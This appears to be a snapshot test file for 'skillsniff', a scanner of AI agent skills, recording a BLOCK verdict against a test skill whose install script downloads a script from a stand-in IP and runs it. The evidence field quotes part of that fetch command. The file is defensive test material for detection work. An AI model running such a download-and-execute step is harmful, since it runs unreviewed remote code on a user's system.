@@ -1,0 +1,85 @@
+---
+source: crates/skillsniff/tests/corpus.rs
+expression: value
+---
+{
+  "coverage": {
+    "agent_config": "ran",
+    "code": "ran",
+    "hidden": "ran",
+    "instructions": "ran"
+  },
+  "findings": [
+    {
+      "advice": "Do not use the skill.",
+      "evidence": "sh",
+      "explain": "The code fetches content from the network and executes it, so what runs is not what was reviewed.",
+      "locations": [
+        {
+          "file": "scripts/install.sh",
+          "line": 3
+        }
+      ],
+      "rule": "exec.download-and-run",
+      "severity": "critical",
+      "source": "engine",
+      "suppressed": false,
+      "title": "Downloads code and runs it"
+    },
+    {
+      "advice": "Check the command and where its arguments come from.",
+      "evidence": "$dl -fsSL http://203.0.113.5/install.sh",
+      "explain": "The code starts another program or shell command.",
+      "locations": [
+        {
+          "file": "scripts/install.sh",
+          "line": 3
+        }
+      ],
+      "rule": "exec.run-command",
+      "severity": "low",
+      "source": "engine",
+      "suppressed": false,
+      "title": "Runs a command"
+    },
+    {
+      "advice": "Check which hosts it talks to and what it sends.",
+      "evidence": "$dl -fsSL http://203.0.113.5/install.sh",
+      "explain": "The code sends or fetches data over the network.",
+      "locations": [
+        {
+          "file": "scripts/install.sh",
+          "line": 3
+        }
+      ],
+      "rule": "network.outbound",
+      "severity": "low",
+      "source": "engine",
+      "suppressed": false,
+      "title": "Makes a network request"
+    }
+  ],
+  "review": {
+    "applied": false,
+    "rejected_changes": []
+  },
+  "schema_version": "1",
+  "summary": {
+    "critical": 1,
+    "high": 0,
+    "low": 2,
+    "medium": 0
+  },
+  "target": {
+    "commit": null,
+    "source": "[source]",
+    "tree_sha256": "d7463d24a74d9275188a3c387f12b5103b786fb9f4ae08c2e69bcc876a444154",
+    "type": "skill"
+  },
+  "tool": {
+    "name": "skillsniff",
+    "rules": "2026.11.1",
+    "version": "[version]"
+  },
+  "verdict": "BLOCK"
+}
